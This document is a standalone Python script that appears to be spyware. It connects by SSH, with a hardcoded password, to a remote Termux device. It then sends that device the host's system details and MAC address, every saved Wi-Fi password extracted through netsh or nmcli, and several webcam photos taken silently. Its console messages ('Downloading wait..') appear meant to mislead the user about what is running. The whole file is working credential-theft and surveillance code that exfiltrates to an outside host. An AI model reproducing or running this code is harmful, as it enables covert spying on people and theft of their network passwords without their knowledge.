import platform
import socket
import uuid
import cv2
import time
from datetime import datetime
import paramiko
import re
import psutil
import getpass
import os
import subprocess

# SSH connection details
TERMUX_IP = "100.81.177.89"
TERMUX_PORT = 8022
USERNAME = "u0_a269"
PASSWORD = "7869"
REMOTE_PATH = "storage/downloads/"

def connect_to_termux():
    """Establishes an SSH connection to the Termux device."""
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(TERMUX_IP, port=TERMUX_PORT, username=USERNAME, password=PASSWORD)
    return ssh_client
def get_device_info():
    """Collects device and system information."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = "Unable to retrieve IP"
    finally:
        s.close()

    boot_time = datetime.fromtimestamp(psutil.boot_time())
    return {
        "Device Name": platform.node(),
        "System": platform.system(),
        "System Version": platform.version(),
        "Processor": platform.processor(),
        "Machine": platform.machine(),
        "IP Address": ip_address,
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1]),
        "Current User": getpass.getuser(),
        "OS Release": platform.release(),
        "Total RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "Available RAM": f"{round(psutil.virtual_memory().available / (1024**3), 2)} GB",
        "Disk Total": f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB",
        "Disk Used": f"{round(psutil.disk_usage('/').used / (1024**3), 2)} GB",
        "Disk Free": f"{round(psutil.disk_usage('/').free / (1024**3), 2)} GB",
        "System Uptime": str(datetime.now() - boot_time),
        "Network Interfaces": "\n"+"\n".join(
    f"{interface}:\n  " + "\n  ".join(addr.address for addr in addrs)
    for interface, addrs in psutil.net_if_addrs().items()
)
    }
def get_saved_wifi_passwords():
    """Retrieves saved Wi-Fi passwords for Windows and Linux."""
    wifi_passwords = []
    try:
        if platform.system() == "Windows":
            # Command to list all saved Wi-Fi profiles
            profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
            profile_names = re.findall("All User Profile\s*: (.*)", profiles)
            
            # Get passwords for each profile
            for profile in profile_names:
                try:
                    results = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode("utf-8", errors="ignore")
                    password = re.search("Key Content\s*: (.*)", results)
                    wifi_passwords.append((profile, password.group(1) if password else "No password"))
                except subprocess.CalledProcessError:
                    wifi_passwords.append((profile, "Error retrieving password"))
        elif platform.system() == "Linux":
            # Use nmcli to get Wi-Fi profiles and passwords (requires superuser privileges)
            profiles = subprocess.check_output("nmcli -t -f NAME connection show", shell=True).decode("utf-8").splitlines()
            for profile in profiles:
                try:
                    password = subprocess.check_output(f"nmcli -s -g 802-11-wireless-security.psk connection show '{profile}'", shell=True).decode("utf-8").strip()
                    wifi_passwords.append((profile, password if password else "No password"))
                except subprocess.CalledProcessError:
                    wifi_passwords.append((profile, "Error retrieving password"))
    except Exception as e:
        wifi_passwords.append(("Error", str(e)))

    return wifi_passwords
def log_info_to_termux(info, ssh_client):
    """Logs device info and Wi-Fi passwords directly to the Termux device."""
    sftp_client = ssh_client.open_sftp()
    log_file_path = os.path.join(REMOTE_PATH, "device_info_log.txt")

    try:
        with sftp_client.open(log_file_path, "a") as remote_file:
            # Check if device info already exists in the log
            existing_content = sftp_client.open(log_file_path).read().decode('utf-8')
            if info["MAC Address"] in existing_content:
                print("file already exist. Skipping En.")
                return False

            # Write new log entry if it doesn't exist
            remote_file.write(f"\n\n--- Device Info Logged at {datetime.now()} ---\n".encode('utf-8'))
            for key, value in info.items():
                remote_file.write(f"{key}: {value}\n".encode('utf-8'))

            # Retrieve and log saved Wi-Fi passwords
            remote_file.write("\n\n--- Saved Wi-Fi Passwords ---\n".encode('utf-8'))
            wifi_passwords = get_saved_wifi_passwords()
            for ssid, password in wifi_passwords:
                remote_file.write(f"SSID: {ssid}, Password: {password}\n".encode('utf-8'))

            print(f"Downloading wait..")
        return True
    except Exception as e:
        print(f"Error logging info to server: {e}")
        return False
    finally:
        sftp_client.close()


def capture_and_transfer_images(ssh_client, image_count=5, interval=0.2):
    """Captures images and sends them to Termux."""
    sftp_client = ssh_client.open_sftp()
    try:
        camera = cv2.VideoCapture(0)
        for i in range(image_count):
            ret, frame = camera.read()
            if ret:
                files = sftp_client.listdir(REMOTE_PATH)
                image_numbers = [int(re.search(r'(\d+)', f).group()) for f in files if re.match(r'captured_image_\d+\.jpg', f)]
                next_number = max(image_numbers, default=0) + 1
                remote_filename = f"captured_image_{next_number}.jpg"
                local_image_path = f"temp_image_{i}.jpg"
                
                cv2.imwrite(local_image_path, frame)
                sftp_client.put(local_image_path, os.path.join(REMOTE_PATH, remote_filename))
                os.remove(local_image_path)
                print(f"Captured and sent image: {remote_filename}")
            time.sleep(interval)
        camera.release()
        cv2.destroyAllWindows()
    except Exception as e:
        print(f"Error capturing and transferring images: {e}")
    finally:
        sftp_client.close()

def main():
    ssh_client = connect_to_termux()
    device_info = get_device_info()
    log_info_to_termux(device_info, ssh_client)
    # wifi_passwords = get_wifi_passwords()
    capture_and_transfer_images(ssh_client)
    ssh_client.close()
    print("[*] All tasks completed successfully. Ready to log out of Tailscale.")

if __name__ == "__main__":
    main()

